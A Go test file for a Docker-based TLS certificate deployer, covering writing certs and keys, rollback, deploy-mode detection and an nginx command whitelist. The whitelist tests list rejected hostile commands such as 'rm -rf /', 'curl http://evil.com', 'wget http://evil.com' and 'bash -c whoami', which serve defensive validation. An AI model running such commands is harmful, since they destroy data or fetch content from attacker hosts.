package docker

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDeployToHost_Success(t *testing.T) {
	tmpDir := t.TempDir()
	certPath := filepath.Join(tmpDir, "cert.pem")
	keyPath := filepath.Join(tmpDir, "key.pem")

	d := &Deployer{
		hostCertPath: certPath,
		hostKeyPath:  keyPath,
	}

	cert := "-----BEGIN CERTIFICATE-----\ntest cert\n-----END CERTIFICATE-----"
	key := "-----BEGIN PRIVATE KEY-----\ntest key\n-----END PRIVATE KEY-----"

	if err := d.deployToHost(cert, key); err != nil {
		t.Fatalf("deployToHost: %v", err)
	}

	// 验证证书内容
	certData, err := os.ReadFile(certPath)
	if err != nil {
		t.Fatalf("read cert: %v", err)
	}
	if string(certData) != cert {
		t.Errorf("cert content mismatch")
	}

	// 验证私钥内容
	keyData, err := os.ReadFile(keyPath)
	if err != nil {
		t.Fatalf("read key: %v", err)
	}
	if string(keyData) != key {
		t.Errorf("key content mismatch")
	}

	// 验证私钥权限（0600）
	keyInfo, err := os.Stat(keyPath)
	if err != nil {
		t.Fatalf("stat key: %v", err)
	}
	if keyInfo.Mode().Perm() != 0600 {
		t.Errorf("key permission = %o, want 0600", keyInfo.Mode().Perm())
	}
}

func TestDeployToHost_Fullchain(t *testing.T) {
	tmpDir := t.TempDir()
	certPath := filepath.Join(tmpDir, "fullchain.pem")
	keyPath := filepath.Join(tmpDir, "key.pem")

	d := &Deployer{
		hostCertPath: certPath,
		hostKeyPath:  keyPath,
	}

	cert := "server cert"
	intermediate := "intermediate cert"
	fullchain := cert + "\n" + intermediate
	key := "private key"

	if err := d.deployToHost(fullchain, key); err != nil {
		t.Fatalf("deployToHost: %v", err)
	}

	data, err := os.ReadFile(certPath)
	if err != nil {
		t.Fatalf("read cert: %v", err)
	}
	if string(data) != fullchain {
		t.Errorf("fullchain content mismatch: got %q", string(data))
	}
}

func TestDeployToHost_DifferentDirectories(t *testing.T) {
	tmpDir := t.TempDir()
	certPath := filepath.Join(tmpDir, "certs", "cert.pem")
	keyPath := filepath.Join(tmpDir, "keys", "key.pem")

	d := &Deployer{
		hostCertPath: certPath,
		hostKeyPath:  keyPath,
	}

	if err := d.deployToHost("cert", "key"); err != nil {
		t.Fatalf("deployToHost: %v", err)
	}

	// 验证两个目录都创建了
	if _, err := os.Stat(filepath.Dir(certPath)); err != nil {
		t.Errorf("cert dir not created: %v", err)
	}
	if _, err := os.Stat(filepath.Dir(keyPath)); err != nil {
		t.Errorf("key dir not created: %v", err)
	}
}

func TestDeployToHost_SameDirectory(t *testing.T) {
	// cert 和 key 在同一个目录，不应创建两次目录
	tmpDir := t.TempDir()
	sslDir := filepath.Join(tmpDir, "ssl")
	certPath := filepath.Join(sslDir, "cert.pem")
	keyPath := filepath.Join(sslDir, "key.pem")

	d := &Deployer{
		hostCertPath: certPath,
		hostKeyPath:  keyPath,
	}

	if err := d.deployToHost("cert-data", "key-data"); err != nil {
		t.Fatalf("deployToHost: %v", err)
	}

	// 验证文件都创建了
	certData, err := os.ReadFile(certPath)
	if err != nil {
		t.Fatalf("read cert: %v", err)
	}
	if string(certData) != "cert-data" {
		t.Errorf("cert content = %q", string(certData))
	}

	keyData, err := os.ReadFile(keyPath)
	if err != nil {
		t.Fatalf("read key: %v", err)
	}
	if string(keyData) != "key-data" {
		t.Errorf("key content = %q", string(keyData))
	}
}

func TestRollback_ModeDetection(t *testing.T) {
	// 测试 Rollback 方法的模式判断逻辑
	client := NewClient("abc123")

	t.Run("volume mode from volumeMode flag", func(t *testing.T) {
		tmpDir := t.TempDir()
		backupCert := filepath.Join(tmpDir, "backup_cert.pem")
		backupKey := filepath.Join(tmpDir, "backup_key.pem")
		hostCert := filepath.Join(tmpDir, "host_cert.pem")
		hostKey := filepath.Join(tmpDir, "host_key.pem")

		// 创建备份文件
		if err := os.WriteFile(backupCert, []byte("backup cert"), 0644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(backupKey, []byte("backup key"), 0600); err != nil {
			t.Fatal(err)
		}

		d := &Deployer{
			client:       client,
			hostCertPath: hostCert,
			hostKeyPath:  hostKey,
			volumeMode:   true,
			// testCommand 和 reloadCommand 留空，testAndReload 会跳过
		}

		// volume 模式下会通过 CopyFile 复制备份，然后 testAndReload 因命令为空跳过
		err := d.Rollback(context.Background(), backupCert, backupKey)
		if err != nil {
			t.Fatalf("Rollback: %v", err)
		}

		// 验证文件确实被复制了（即 volume 模式路径被执行了）
		hostCertData, readErr := os.ReadFile(hostCert)
		if readErr != nil {
			t.Fatalf("host cert not written: %v", readErr)
		}
		if string(hostCertData) != "backup cert" {
			t.Errorf("host cert = %q, want 'backup cert'", string(hostCertData))
		}

		hostKeyData, readErr := os.ReadFile(hostKey)
		if readErr != nil {
			t.Fatalf("host key not written: %v", readErr)
		}
		if string(hostKeyData) != "backup key" {
			t.Errorf("host key = %q, want 'backup key'", string(hostKeyData))
		}
	})
}

func TestNewDeployer_DefaultCommands(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath: "/ssl/cert.pem",
		KeyPath:  "/ssl/key.pem",
	})

	if d.testCommand != "nginx -t" {
		t.Errorf("testCommand = %q, want 'nginx -t'", d.testCommand)
	}
	if d.reloadCommand != "nginx -s reload" {
		t.Errorf("reloadCommand = %q, want 'nginx -s reload'", d.reloadCommand)
	}
}

func TestNewDeployer_CustomCommands(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath:      "/ssl/cert.pem",
		KeyPath:       "/ssl/key.pem",
		TestCommand:   "/usr/sbin/nginx -t",
		ReloadCommand: "kill -HUP 1",
	})

	if d.testCommand != "/usr/sbin/nginx -t" {
		t.Errorf("testCommand = %q", d.testCommand)
	}
	if d.reloadCommand != "kill -HUP 1" {
		t.Errorf("reloadCommand = %q", d.reloadCommand)
	}
}

func TestGetDeployMode(t *testing.T) {
	client := NewClient("abc123")

	tests := []struct {
		name       string
		opts       DeployerOptions
		volumeMode bool
		want       string
	}{
		{
			name:       "auto 默认",
			opts:       DeployerOptions{CertPath: "/ssl/cert.pem", KeyPath: "/ssl/key.pem"},
			volumeMode: false,
			want:       "auto",
		},
		{
			name:       "volume 模式",
			opts:       DeployerOptions{CertPath: "/ssl/cert.pem", KeyPath: "/ssl/key.pem"},
			volumeMode: true,
			want:       "volume",
		},
		{
			name: "copy 模式",
			opts: DeployerOptions{
				CertPath:   "/ssl/cert.pem",
				KeyPath:    "/ssl/key.pem",
				DeployMode: "copy",
			},
			want: "copy",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := NewDeployer(client, tt.opts)
			d.volumeMode = tt.volumeMode
			if got := d.GetDeployMode(); got != tt.want {
				t.Errorf("GetDeployMode() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestIsVolumeMode(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath: "/ssl/cert.pem",
		KeyPath:  "/ssl/key.pem",
	})

	if d.IsVolumeMode() {
		t.Error("expected IsVolumeMode() = false initially")
	}

	d.SetHostPaths("/host/cert.pem", "/host/key.pem")
	if !d.IsVolumeMode() {
		t.Error("expected IsVolumeMode() = true after SetHostPaths")
	}
}

func TestGetHostPaths(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath:     "/ssl/cert.pem",
		KeyPath:      "/ssl/key.pem",
		HostCertPath: "/host/cert.pem",
		HostKeyPath:  "/host/key.pem",
	})

	certPath, keyPath := d.GetHostPaths()
	if certPath != "/host/cert.pem" {
		t.Errorf("certPath = %q", certPath)
	}
	if keyPath != "/host/key.pem" {
		t.Errorf("keyPath = %q", keyPath)
	}
}

func TestSetHostPaths(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath: "/ssl/cert.pem",
		KeyPath:  "/ssl/key.pem",
	})

	d.SetHostPaths("/host/cert.pem", "/host/key.pem")
	certPath, keyPath := d.GetHostPaths()
	if certPath != "/host/cert.pem" {
		t.Errorf("certPath = %q", certPath)
	}
	if keyPath != "/host/key.pem" {
		t.Errorf("keyPath = %q", keyPath)
	}
	if !d.IsVolumeMode() {
		t.Error("expected VolumeMode = true")
	}
}

func TestSetHostPaths_Empty(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath: "/ssl/cert.pem",
		KeyPath:  "/ssl/key.pem",
	})

	d.SetHostPaths("", "")
	if d.IsVolumeMode() {
		t.Error("expected VolumeMode = false for empty paths")
	}
}

func TestCreateFromSite_VolumeMode(t *testing.T) {
	client := NewClient("abc123")
	site := &SSLSite{
		CertificatePath: "/ssl/cert.pem",
		PrivateKeyPath:  "/ssl/key.pem",
		HostCertPath:    "/host/cert.pem",
		HostKeyPath:     "/host/key.pem",
		VolumeMode:      true,
	}

	d := CreateFromSite(client, site, "nginx -t", "nginx -s reload")
	if d.deployMode != "volume" {
		t.Errorf("deployMode = %q, want volume", d.deployMode)
	}
	if d.hostCertPath != "/host/cert.pem" {
		t.Errorf("hostCertPath = %q", d.hostCertPath)
	}
}

func TestCreateFromSite_CopyMode(t *testing.T) {
	client := NewClient("abc123")
	site := &SSLSite{
		CertificatePath: "/ssl/cert.pem",
		PrivateKeyPath:  "/ssl/key.pem",
		VolumeMode:      false,
	}

	d := CreateFromSite(client, site, "", "")
	if d.deployMode != "copy" {
		t.Errorf("deployMode = %q, want copy", d.deployMode)
	}
	if d.testCommand != "nginx -t" {
		t.Errorf("testCommand = %q, want default 'nginx -t'", d.testCommand)
	}
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"nginx -t", true},
		{"nginx -s reload", true},
		{"nginx -s reopen", true},
		{"/usr/sbin/nginx -t", true},
		{"/usr/sbin/nginx -s reload", true},
		{"kill -HUP 1", true},
		{"rm -rf /", false},
		{"curl http://evil.com", false},
		{"", false},
		{" nginx -t ", true}, // 带空格
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := ValidateCommand(tt.cmd); got != tt.want {
				t.Errorf("ValidateCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestDetectDeployMode_HostPathsPreset(t *testing.T) {
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath:     "/ssl/cert.pem",
		KeyPath:      "/ssl/key.pem",
		HostCertPath: "/host/ssl/cert.pem",
		HostKeyPath:  "/host/ssl/key.pem",
	})

	mode, err := d.DetectDeployMode(context.Background())
	if err != nil {
		t.Fatalf("DetectDeployMode: %v", err)
	}
	if mode != "volume" {
		t.Errorf("mode = %q, want volume", mode)
	}
	if !d.IsVolumeMode() {
		t.Error("expected IsVolumeMode() = true")
	}
}

func TestDetectDeployMode_OnlyCertHostPath(t *testing.T) {
	// 只设置 hostCertPath 不设置 hostKeyPath，不应直接返回 volume
	client := NewClient("abc123")
	d := NewDeployer(client, DeployerOptions{
		CertPath:     "/ssl/cert.pem",
		KeyPath:      "/ssl/key.pem",
		HostCertPath: "/host/ssl/cert.pem",
		// HostKeyPath 为空
	})

	// 这会尝试获取容器信息（会失败因为无真实 docker），降级到 copy
	mode, err := d.DetectDeployMode(context.Background())
	if err != nil {
		t.Fatalf("DetectDeployMode: %v", err)
	}
	// 因为 hostKeyPath 为空，不会走快速 volume 路径
	// 获取容器信息失败后降级到 copy
	if mode != "copy" {
		t.Errorf("mode = %q, want copy", mode)
	}
}

func TestTestAndReload_WhitelistValidation(t *testing.T) {
	client := NewClient("abc123")

	tests := []struct {
		name          string
		testCmd       string
		reloadCmd     string
		wantErr       bool
		wantErrSubstr string
	}{
		{
			name:      "valid default commands",
			testCmd:   "nginx -t",
			reloadCmd: "nginx -s reload",
			// 命令通过白名单但 docker exec 会失败（无真实 docker）
			// testAndReload 先检查白名单，通过后尝试 exec
			// 由于 exec 也有 validateExecCommand，最终还是报错
			wantErr: true,
		},
		{
			name:          "invalid test command",
			testCmd:       "rm -rf /",
			reloadCmd:     "nginx -s reload",
			wantErr:       true,
			wantErrSubstr: "not in whitelist",
		},
		{
			name:          "invalid reload command with empty test",
			testCmd:       "",
			reloadCmd:     "curl http://evil.com",
			wantErr:       true,
			wantErrSubstr: "not in whitelist",
		},
		{
			name:          "both invalid",
			testCmd:       "bash -c whoami",
			reloadCmd:     "wget http://evil.com",
			wantErr:       true,
			wantErrSubstr: "not in whitelist",
		},
		{
			name:      "empty commands - skip both",
			testCmd:   "",
			reloadCmd: "",
			wantErr:   false,
		},
		{
			name:      "kill HUP allowed",
			testCmd:   "nginx -t",
			reloadCmd: "kill -HUP 1",
			wantErr:   true, // 白名单通过，但 docker exec 失败
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := &Deployer{
				client:        client,
				testCommand:   tt.testCmd,
				reloadCommand: tt.reloadCmd,
			}
			err := d.testAndReload(context.Background())
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error")
				}
				if tt.wantErrSubstr != "" && !strings.Contains(err.Error(), tt.wantErrSubstr) {
					t.Errorf("error = %q, want containing %q", err.Error(), tt.wantErrSubstr)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestValidateCommand_AllWhitelist(t *testing.T) {
	// 验证白名单中的所有命令都能通过 ValidateCommand
	for cmd := range allowedContainerCommands {
		if !ValidateCommand(cmd) {
			t.Errorf("ValidateCommand(%q) = false, should be in whitelist", cmd)
		}
	}
}

func TestGetDir(t *testing.T) {
	tests := []struct {
		path string
		want string
	}{
		{"/etc/nginx/ssl/cert.pem", "/etc/nginx/ssl"},
		{"/cert.pem", ""},
		{"file.pem", ""},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			if got := getDir(tt.path); got != tt.want {
				t.Errorf("getDir(%q) = %q, want %q", tt.path, got, tt.want)
			}
		})
	}
}
